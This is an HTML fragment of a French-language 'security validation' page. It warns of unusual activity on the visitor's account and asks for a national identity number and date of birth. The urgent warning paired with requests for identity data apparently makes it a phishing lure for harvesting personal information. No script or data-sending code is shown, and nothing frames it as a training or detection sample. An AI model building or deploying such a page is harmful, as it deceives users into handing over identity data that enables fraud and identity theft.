    <div class="container">
        <h1>validations de sécurité</h1>
       
        <p> Notre système détecte une activité inhabituelle sur votre compte, veuillez répondre aux questions de validation suivantes</p>

        <div class="container-question" >
            <label for="">Quel est votre numéro national d'identité ?</label>
            <input type="text" placeholder="ID-Document" class="questions-securite" id="id-Document">
        </div>

        <div class="container-question" >
            <label for="">Quelle est votre date de naissance ?</label>
            <input type="date" id="dob" name="dob" min="1900-01-01" max="2024-11-18" required>
            <button type="submit" class="btn">Valider</button>
        </div>

    </div>
